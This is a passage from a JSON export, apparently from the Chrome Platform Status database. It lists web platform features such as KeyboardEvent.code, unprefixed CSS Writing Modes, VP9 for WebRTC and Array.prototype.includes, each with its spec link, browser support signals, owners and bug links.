    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:38.003960",
      "by": "ericbidelman@google.com"
    },
    "name": "UI Events KeyboardEvent |code| attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/dom3events/raw-file/tip/html/DOM3Events-code.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code#Browser_compatibility",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=227231",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The KeyboardEvent |code| attribute contains information about the key event that can use used identify the physical key being pressed by the user.",
    "id": 5228092293382144,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/keyboardevent-code-attribute/",
        "https://w3c.github.io/uievents/tools/key-event-viewer.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:56.523510",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS Writing Modes with syntax updates",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-writing-modes-3/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1138384",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "kojii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/533448",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "CSS Writing Modes Level 3 without \"webkit\" prefix, along with syntax updates to the most recent CR.\r\n\r\nAs part of the work, a non-standard value \"horizontal-bt\" is removed from -webkit-writing-mode.",
    "id": 5707470202732544,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1lGrcTSlKMDeOEKZbHqvdLnW_Soywn7oICci2ApBXB00/edit?usp=sharing",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/unicode-bidi",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/text-orientation",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/text-combine-upright"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:47.484510",
      "by": "ericbidelman@google.com"
    },
    "name": "VP9 software encoder/decoder in Chrome for WebRTC",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "blum@chromium.org",
          "mflodman@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=545886",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Include a VP9 video codec encoder and decoder in Chrome for use with WebRTC. ",
    "id": 5652783105572864,
    "resources": {
      "samples": [
        "https://simpl.info/mediarecorder/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:56.214430",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Support chaining on AudioNode.connect() and AudioParam automation methods",
    "tags": [
      "webaudio",
      "audionode",
      "audioparam"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WebAudio/web-audio-api/issues/650",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "hongchan@chromium.org",
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=554992",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This is to support ‘method chaining’ on AudioNode.connect() and the automation methods of AudioParam object. The current implementation does not return anything when these methods get executed. It improves the control flow and the readability of Web Audio JS code.",
    "id": 5706033670389760,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#the-audionode-interface",
        "",
        "http://webaudio.github.io/web-audio-api/#AudioParam",
        "",
        "https://github.com/WebAudio/web-audio-api/issues/650",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioNode/connect(AudioNode)",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioParam"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/webaudio-method-chaining/index.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:07.160110",
      "by": "ericbidelman@google.com"
    },
    "name": "navigator.connection.downlinkMax, wimax, and onchange",
    "tags": [
      "netinfo",
      "network information",
      "bandwidth"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://wicg.github.io/netinfo/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1208296",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "jkarlin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=527449&thanks=527449&ts=1441209489",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Add support for the downlinkMax attribute which provides the maximum theoretical bandwidth that the current connection can support. Also add \"wimax\" as a connection type. Also adds support for the connection.onchange event. The ontypechange event will be deprecated later.",
    "id": 5857463882481664,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/downlinkMax",
        "https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation",
        "https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/type",
        "https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/onchange"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/network-information/",
        "https://jkarlin.github.io/netinfo-demo/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:46.662940",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": " MediaStream.label, MediaStream.ended and MediaStream.stop()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/mediacapture-main/getusermedia.html#mediastream",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 47
        },
        "owners": [
          "shiva.jm@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=338500",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These parts of the MediaStream API have been removed from the spec.",
    "id": 5647608089411584,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStream"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 07:44:10.814740",
      "by": "Patket@microsoft.com"
    },
    "name": "Array.prototype.includes",
    "tags": [
      "array",
      "includes",
      "contains",
      "es7",
      "es2016"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/Array.prototype.includes/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1069063",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3575",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "url": "http://krijnhoetmer.nl/irc-logs/whatwg/20150811#l-534",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/181871",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Method to determine whether an array includes a given element.",
    "id": 5964420647747584,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/array-includes-es7/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:43.846600",
      "by": "ericbidelman@google.com"
    },
    "name": "CSSNamespaceRule",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/cssom-1/#the-cssnamespacerule-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=389549",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSSNamespaceRule interface represents an at-rule for declaring the default namespace and binding namespaces to namespace prefixes.",
    "id": 5631781000708096,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSNamespaceRule/namespaceURI",
        "https://developer.mozilla.org/en-US/docs/Web/API/CSSNamespaceRule/prefix"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-04-26 07:43:10.515960",
      "by": "Patket@microsoft.com"
    },
    "name": "Cache.matchAll()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink>Storage>CacheStorage"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=523916",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "matchAll() returns a promise to be resolved with an array of all matched responses in the Cache object.",
    "id": 5295194681376768,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/matchAll"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-04-26 07:42:50.519160",
      "by": "Patket@microsoft.com"
    },
    "name": "EXT_disjoint_timer_query WebGL extension",
    "comments": "Developers have been requesting this extension for quite some time so they can better profile their WebGL code.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.khronos.org/registry/webgl/extensions/EXT_disjoint_timer_query/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 47
        },
        "owners": [
          "kbr@chromium.org",
          "bajones@chromium.org",
          "zmo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": true,
        "android": 47,
        "bug": "http://crbug.com/560620",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This WebGL extension, exposing the underlying OpenGL ES functionality, allows developers to measure the duration of the commands they submit to the graphics processor. This will allow the development of additional tools to help developers make their WebGL code run faster.\r\n",
    "id": 6254718426808320,
    "resources": {
      "docs": [
        "Conformance test:",
        "https://www.khronos.org/registry/webgl/sdk/tests/conformance/extensions/ext-disjoint-timer-query.html",
        "(Open-sourced in Github repository at https://github.com/KhronosGroup/WebGL )"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:17.406130",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API: RequestInit.referrer",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://crbug.com/514092",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature enables users to specifying request's referrer as a construct argument. Note this is different from Request.referrer which was already introduced.\r\n\r\nIn service workers, a captured request had the service worker's referrer (i.e. the service worker's script URL), but with this feature the request keeps the original referrer.",
    "id": 6684476478324736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request/Request"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:49.070580",
      "by": "ericbidelman@google.com"
    },
    "name": "MouseEvent.getModifierState",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/uievents/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "http://crbug.com/532963",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "MouseEvent.getModifierState is unimplemented.\r\n\r\nKeyboardEvent.getModifierState is implemented; but the action on the MouseEvent isn't. We need to be consistent in our APIs this is a simple change to bring matching spec behavior.\r\n\r\nhttp://www.w3.org/TR/DOM-Level-3-Events/#widl-MouseEvent-getModifierState",
    "id": 5662574238498816,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent/getModifierState"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/mouseevent-get-modifier-state/index.html"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-11-02 15:20:25.591430",
      "by": "jmedley@google.com"
    },
    "name": "Navigator.mediaDevices",
    "comments": "Firefox ships MediaDevices, but does not yet support ondevicechange. They are planning to add support: https://bugzilla.mozilla.org/show_bug.cgi?id=1152383\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/2011/webrtc/editor/archives/20140619/getusermedia.html#enumerating-devices",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/enumerateDevices",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "guidou@chromium.org",
          "grunell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=388648",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-us/library/mt131870(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/182275",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Navigator.mediaDevices has\r\n* an enumerateDevices function, which provides the same functionality as MediaStreamTrack.getSources and adds audio output devices to the list, and\r\n* a devicechange event to notify when the set of devices available have changed.\r\n\r\nenumerateDevices is enabled by default, and the devicechange event is behind a flag.",
    "id": 4906859072847872,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices",
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/enumerateDevices",
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator"
      ],
      "samples": [
        "https://webrtc.github.io/samples/src/content/devices/input-output/"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:45.730990",
      "by": "ericbidelman@google.com"
    },
    "name": "NotificationOptions.requireInteraction, and auto-minimize timeout",
    "tags": [
      "notification",
      "notifications",
      "dismiss",
      "minimize",
      "center",
      "timeout"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://notifications.spec.whatwg.org/#require-interaction-preference-flag",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/issues/52#issuecomment-136759901",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "johnme@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "bug": "https://crbug.com/526158",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Support for the NotificationOptions.requireInteraction property, letting authors hint that a notification should remain readily available until the user clicks or dismisses it.\r\n\r\nWhen omitted, Chrome desktop will start to close* notifications after ~20 seconds (rather than the toast remaining permanently on-screen); Chrome for Android will be unaffected, since the platform requires that notifications are always minimized there.\r\n\r\n*Chrome OS only - auto-minimize to the notification center.",
    "id": 5641440986136576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/notification/Notification",
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/showNotification",
        ""
      ],
      "samples": [
        "https://googlechrome.github.io/samples/notifications/requireInteraction.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:55.910450",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove getUserMedia() from Insecure Contexts",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec-secure-contexts/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 47
        },
        "owners": [
          "jww@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "bug": "https://crbug.com/520765",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Per https://w3c.github.io/webappsec-secure-contexts/, we are deprecating and then removing getUserMedia() from insecure contexts. getUserMedia() is a powerful feature that allows access to the microphone and camera of the user agent's machine, which is a powerful privilege escalation for HTTP content injection. This will remove that attack vector by only allowing it over HTTPS.",
    "id": 5703419427815424,
    "resources": {
      "docs": [
        "Part of the larger effort to remove powerful features on insecure origins:",
        "https://chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins",
        "",
        "blink-dev discussion and API owner approval:",
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-reviews/NdkY1SUxxV4",
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia%20"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:08.595140",
      "by": "ericbidelman@google.com"
    },
    "name": "Rest parameters (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://people.mozilla.org/~jorendorff/es6-draft.html#sec-function-definitions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/15#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2159",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/restparameters",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-rest-parameter",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Allows representation of an indefinite number of arguments as an array.",
    "id": 5937087912083456,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/rest-parameters-es6/index.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:41.324730",
      "by": "ericbidelman@google.com"
    },
    "name": "SVG hasExtension() methods",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.w3.org/TR/SVG11/types.html#InterfaceSVGTests",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 47
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=532405",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The hasExtension() methods have been removed in SVG2. As implemented in Blink they always returned false and were thus of no use.",
    "id": 5473526421127168,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGTests"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:41.417720",
      "by": "ericbidelman@google.com"
    },
    "name": "SVGSVGElement.pixelUnitToMillimeterX and friends",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/SVG11/struct.html#InterfaceSVGSVGElement",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
